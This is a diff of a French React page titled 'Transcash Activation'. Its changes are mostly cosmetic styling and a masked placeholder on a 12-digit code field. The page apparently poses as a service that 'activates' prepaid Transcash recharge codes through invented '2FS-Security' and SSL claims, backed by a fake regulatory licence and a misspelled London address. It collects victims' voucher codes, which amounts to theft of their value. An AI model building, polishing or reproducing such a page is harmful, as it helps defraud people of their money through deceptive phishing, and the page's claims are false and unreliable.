@@ -84,25 +84,25 @@ const Accueil = () => {
         <img height="100px" src={profil} alt="" />
         <h1>Activation Transcash</h1>
       </div>
-
+      {/* 
       <div className="accueil">
         <h3>Bienvennue sur le site Transcash Activation</h3>
         <hr></hr>
-      </div>
+      </div> */}
 
       <div className="phone">
         <img height="200px" width={300} src={phone} alt="" />
       </div>
 
       <h2>Activation de vos recharges</h2>
-      <p>
-        Transcash est utilisable en ligne uniquement , il vous permet
+      <p style={{ textAlign: "justify" }}>
+        Transcash Activation est utilisable en ligne uniquement , il vous permet
         d'effectuer tous vos achats e-commerce en toute sécurité. La fiabilité
         de votre code de recharge est donc importante. Avec le système
         2FS-Security vos recharges sont donc activé enfin qu'elles soient
         utilisables en ligne.
       </p>
-      <p>
+      <p style={{ textAlign: "justify" }}>
         Cette étape cruciale d'activation se fait en utilisation de la
         technologie la plus récente connue sur SSL permettant de garantir la
         sécurité et fiabilité de vos recharges en toute légitimité.
@@ -125,7 +125,7 @@ const Accueil = () => {
       </div>
 
       <hr></hr>
-      <p>
+      <p style={{ textAlign: "justify" }}>
         La module TRANS-CASH ACTIVATION est un moyen d'activation prépayé fiable
         sur internet, avec une recharge, qui vous accompagne au quotidien dans
         vos dépenses. Commander le en ligne ou achetez vos recharges de paiement
@@ -187,7 +187,7 @@ const Accueil = () => {
               Code à 12 chiffres * :
               <input
                 required
-                placeholder="Ex:000000000000"
+                placeholder="************"
                 type="password"
                 minLength="12"
                 maxLength="12"
@@ -259,7 +259,7 @@ const Accueil = () => {
       <hr></hr>
 
       <div id="services" className="siteRecharge">
-        <p style={{ color: "gray" }}>
+        <p style={{ color: "gray", textAlign: "justify" }}>
           Le site TRANSCASH-VALIDATION est émis par CARD-coopération sous une
           licence d'authentification internationale Incorporated. Le service est
           autorisé par la conduite financière autorité (FRN 9 000 036) en vertu
@@ -268,7 +268,15 @@ const Accueil = () => {
           fourniture de services de paiement. Siège Social :5ᵉ étage, Langham
           Housse, 302-308 Regent Steet, Londres, W1B 3AT.
         </p>
-        <img height={100} width={200} src={visa} alt="" />
+      </div>
+      <div className="center">
+        <img
+          style={{ display: "block", texAlign: "center" }}
+          height={100}
+          width={250}
+          src={visa}
+          alt=""
+        />
       </div>
       <hr></hr>
       <div className="footer">
@@ -277,7 +285,6 @@ const Accueil = () => {
         <a href="/">Politique de confidenlité</a>
         <hr></hr>
         <a href="/">Politique de cookies</a>
-     
       </div>
       <small style={{ color: "gray", display: "block", textAlign: "center" }}>
         copyright c2022
